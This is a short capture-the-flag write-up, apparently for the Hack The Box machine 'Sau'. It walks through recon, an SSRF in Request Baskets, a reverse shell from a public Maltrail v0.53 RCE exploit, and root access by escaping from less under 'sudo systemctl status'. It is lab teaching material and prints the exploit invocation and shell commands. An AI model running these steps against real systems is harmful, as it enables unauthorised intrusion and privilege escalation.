# Recon

Let us start with our nmap scan

---

Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-12 00:26 EST
Nmap scan report for 10.10.11.224
Host is up (0.058s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds

---

We can see that we have port 22, 80 and 55555, but port 80 is filtered so we cannot visit this even if we try, so we first try visiting port 55555.

We see that this is Request Baskets and upon searching about this, we find that there is an SSRF issue here that we can leverage.
We can forward port 80 to this request basket.

Now we can visit visit http://10.10.11.224:55555/d0kb80v and see that port 80 is running Maltrail v0.53. With some searching, we can see that there is an RCE vulnerability on this https://github.com/spookier/Maltrail-v0.53-Exploit


# Exploitation
Let us clone this repository, setup a listener on port 111 and run the exploit to get a reverse shell

---
python3 exploit.py 10.10.14.36 1111 http://sau.htb:55555/mhvi3fu
---

We can now obtain the user flag at /home/puma/user.txt

At this point, let us also upgrade our shell to a pty shell using

---
python3 -c 'import pty; pty.spawn("/bin/bash")'
---

# Privilege Escalation

Running sudo -l reveals that we can run sudo on /usr/bin/systemctl status trail.service

![Alt text](/assets/uploads/htb-sau/2024-01-12 14_17_23.png)

So let us do that and we can see that the systemctl is running the less command to show us all the information, so what we can do is to run !sh to exit the terminal and we retain sudo privileges

Now we can just obtain the root flag at /root/root.txt
